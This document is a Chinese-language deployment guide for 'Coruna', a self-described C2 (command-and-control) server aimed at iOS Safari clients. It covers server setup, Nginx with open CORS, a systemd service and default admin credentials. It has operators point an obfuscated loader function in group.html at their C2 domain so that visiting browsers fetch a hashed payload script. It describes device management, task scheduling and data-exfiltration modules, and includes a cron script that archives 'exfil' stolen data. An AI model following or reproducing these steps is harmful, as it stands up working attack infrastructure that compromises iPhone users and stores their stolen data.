# Coruna 部署指南

> 🌐 [English Version](DEPLOYMENT.md) | 中文版本

---

## 服务器要求

| 项目 | 最低配置 | 推荐配置 |
|------|---------|---------|
| **CPU** | 4 核 | 14+ 核 |
| **内存** | 4 GB | 8+ GB |
| **磁盘** | 20 GB | 50+ GB SSD |
| **操作系统** | Linux (Ubuntu 20.04+ / CentOS 8+ / Debian 11+) | Linux |
| **带宽** | 5 Mbps | 10+ Mbps |

---

## 软件环境

| 软件 | 版本要求 | 说明 |
|------|---------|------|
| **Python** | 3.8+ | 后端运行环境 |
| **Nginx** | 1.18+ | Web 服务器（推荐） |
| **Apache** | 2.4+ | 替代 Web 服务器 |
| **SQLite3** | 内置 | 数据库（无需额外安装） |
| **OpenSSL** | 1.1.1+ | HTTPS 支持 |

---

## 端口要求

| 端口 | 用途 | 备注 |
|------|------|------|
| **8782** | C2 管理面板和 API | 主要端口 |
| **443** | HTTPS（加密流量） | 推荐，iOS Safari WASM 支持 |
| **80** | HTTP 重定向到 HTTPS | 可选 |

---

## 部署架构

```
┌─────────────────────────────────────────────────────────┐
│                     [客户端]                             │
│                   iOS Safari                             │
└─────────────────────┬───────────────────────────────────┘
                      │ HTTPS
                      ▼
┌─────────────────────────────────────────────────────────┐
│                   [Nginx]                               │
│              端口: 443 / 8782                           │
│         SSL 终止 + 反向代理                              │
└─────────────────────┬───────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────┐
│              [FastAPI C2 Server]                        │
│                  端口: 8782                             │
│                                                         │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐    │
│  │  设备管理    │  │   任务调度   │  │  数据外泄    │    │
│  └─────────────┘  └─────────────┘  └─────────────┘    │
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │              SQLite 数据库                        │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │         静态文件 (group.html, *.js)             │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

---

## 部署步骤

### 1. 服务器初始化

```bash
# Ubuntu / Debian
apt update && apt upgrade -y
apt install -y python3 python3-pip python3-venv nginx certbot

# CentOS / RHEL
yum update -y
yum install -y python3 python3-pip nginx certbot
```

### 2. 上传项目文件

```bash
# 创建目录
mkdir -p /var/www/coruna

# 上传文件 (使用 SCP/SFTP/FTP)
scp -r /path/to/coruna/* root@your-server:/var/www/coruna/

# 设置权限
chown -R www-data:www-data /var/www/coruna
chmod -R 755 /var/www/coruna
```

### 3. 安装 Python 依赖

```bash
cd /var/www/coruna/backend

# 创建虚拟环境
python3 -m venv venv
source venv/bin/activate

# 安装依赖
pip install -r requirements.txt
```

### 4. 配置 C2 服务器地址

修改 `group.html` 第 52-54 行，将服务器地址改为你的实际地址：

```javascript
function fqMaGkNg() {
    // 修改为你的服务器地址
    return "https://your-domain.com:8782/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js";
}
```

### 5. 配置 Nginx

创建配置文件 `/etc/nginx/sites-available/coruna`：

```nginx
upstream coruna_backend {
    server 127.0.0.1:8782;
    keepalive 32;
}

server {
    listen 443 ssl http2;
    server_name your-domain.com;

    # SSL 配置
    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    root /var/www/coruna;
    index group.html;

    # 禁用缓存
    add_header Cache-Control "no-cache, no-store, must-revalidate";
    add_header Pragma "no-cache";
    add_header Expires "0";

    # Gzip 压缩
    gzip on;
    gzip_types text/plain text/css application/javascript application/json;
    gzip_min_length 1000;

    location / {
        try_files $uri $uri/ =404;
    }

    # 反向代理 API 请求
    location /api/ {
        proxy_pass http://coruna_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 300s;
        proxy_connect_timeout 75s;
    }

    # WebSocket 支持
    location /ws/ {
        proxy_pass http://coruna_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_read_timeout 86400s;
    }

    # CORS 头
    add_header Access-Control-Allow-Origin "*" always;
    add_header Access-Control-Allow-Methods "GET, POST, OPTIONS" always;
    add_header Access-Control-Allow-Headers "*" always;

    # 日志
    access_log /var/log/nginx/coruna_access.log;
    error_log /var/log/nginx/coruna_error.log;
}

# HTTP 重定向到 HTTPS
server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$server_name$request_uri;
}
```

启用配置：

```bash
ln -s /etc/nginx/sites-available/coruna /etc/nginx/sites-enabled/
nginx -t
systemctl reload nginx
```

### 6. 配置 HTTPS（Let's Encrypt）

```bash
# 安装 certbot
apt install certbot python3-certbot-nginx

# 获取证书
certbot --nginx -d your-domain.com

# 自动续期测试
certbot renew --dry-run
```

### 7. 配置防火墙

```bash
# UFW
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw enable

# 或使用 iptables
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables-save
```

### 8. 创建 systemd 服务

创建文件 `/etc/systemd/system/coruna.service`：

```ini
[Unit]
Description=Coruna C2 Server
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/coruna/backend
ExecStart=/var/www/coruna/backend/venv/bin/python -m uvicorn main:app --host 127.0.0.1 --port 8782
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

启动服务：

```bash
systemctl daemon-reload
systemctl enable coruna
systemctl start coruna
systemctl status coruna
```

---

## 验证部署

### 测试访问

```bash
# 测试管理面板
curl https://your-domain.com/

# 测试 group.html
curl https://your-domain.com/group.html

# 测试 API
curl https://your-domain.com/api/info
```

### 浏览器访问

- 管理面板：`https://your-domain.com/`
- 默认用户名：`admin`
- 默认密码：`admin123`

---

## 维护操作

### 日志查看

```bash
# 应用日志
journalctl -u coruna -f

# Nginx 访问日志
tail -f /var/log/nginx/coruna_access.log

# Nginx 错误日志
tail -f /var/log/nginx/coruna_error.log
```

### 备份

```bash
# 创建备份脚本
cat > /usr/local/bin/backup-coruna.sh << 'EOF'
#!/bin/bash
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backup/coruna"

mkdir -p $BACKUP_DIR

# 备份数据库
cp /var/www/coruna/coruna_c2.db $BACKUP_DIR/coruna_$DATE.db

# 备份外泄数据
tar -czf $BACKUP_DIR/exfil_$DATE.tar.gz -C /var/www/coruna data/exfil/ 2>/dev/null || true

# 清理 30 天前的备份
find $BACKUP_DIR -name "coruna_*.db" -mtime +30 -delete
find $BACKUP_DIR -name "exfil_*.tar.gz" -mtime +30 -delete

echo "Backup completed: $DATE"
EOF

chmod +x /usr/local/bin/backup-coruna.sh

# 添加定时任务（每天凌晨 3 点）
echo "0 3 * * * /usr/local/bin/backup-coruna.sh" | crontab -
```

### 更新部署

```bash
# 停止服务
systemctl stop coruna

# 备份当前版本
cp -r /var/www/coruna /var/www/coruna.bak.$(date +%Y%m%d)

# 上传新版本文件
scp -r /path/to/new/coruna/* root@your-server:/var/www/coruna/

# 重新启动服务
systemctl start coruna
```

---

## 故障排查

| 问题 | 解决方案 |
|------|---------|
| 无法访问页面 | 检查 Nginx 服务状态和防火墙配置 |
| API 返回 500 | 查看应用日志 `journalctl -u coruna` |
| iOS Safari 无法加载 | 确保使用 HTTPS，检查 CORS 配置 |
| WebSocket 连接失败 | 检查 Nginx WebSocket 配置 |
| 数据库错误 | 检查 SQLite 文件权限 |

### 常用命令

```bash
# 查看服务状态
systemctl status coruna

# 重启服务
systemctl restart coruna

# 查看端口监听
netstat -tlnp | grep 8782

# 测试 Nginx 配置
nginx -t

# 重载 Nginx
systemctl reload nginx
```

---

## 性能优化

### Nginx 优化

```nginx
# worker 进程数（建议设置为 CPU 核心数）
worker_processes auto;

# worker 连接数
worker_connections 4096;

# 开启高效文件传输
sendfile on;
tcp_nopush on;
tcp_nodelay on;
```

### 系统优化

```bash
# 调整文件描述符限制
echo "* soft nofile 65535" >> /etc/security/limits.conf
echo "* hard nofile 65535" >> /etc/security/limits.conf

# 网络优化
echo "net.core.somaxconn = 1024" >> /etc/sysctl.conf
sysctl -p
```

---

## 安全建议

1. **修改默认密码**：首次使用后立即修改管理员密码
2. **启用防火墙**：仅开放必要端口
3. **配置 SSL**：使用 HTTPS 保护通信
4. **定期备份**：设置自动备份任务
5. **监控日志**：定期检查访问和错误日志
6. **限制 IP**：考虑配置 IP 白名单

---

**最后更新**：2026-06-26  
**版本**：1.0
